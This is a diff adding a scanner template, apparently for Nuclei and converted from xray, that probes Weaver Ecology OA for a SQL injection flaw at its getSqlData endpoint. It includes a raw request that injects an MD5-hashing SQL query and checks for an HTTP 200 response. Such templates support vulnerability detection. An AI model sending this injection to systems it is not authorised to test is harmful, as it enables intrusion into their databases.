@@ -1,0 +1,21 @@
+id: poc-yaml-weaver-ecology-getsqldata-sqli-rce
+
+info:
+  name: poc-yaml-weaver-ecology-getsqldata-sqli-rce
+  author: xiaoguaiii
+  severity: high
+  tags: xray-converted,rce,sqli,ct-442574
+  reference:
+    - https://github.com/Wrin9/weaverOA_sql_RCE/blob/main/weaverOA_sql_injection_POC_EXP.py
+
+http:
+  - raw:
+      - |
+        GET /Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{rand_int(1000, 9999)}}')),3,32) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
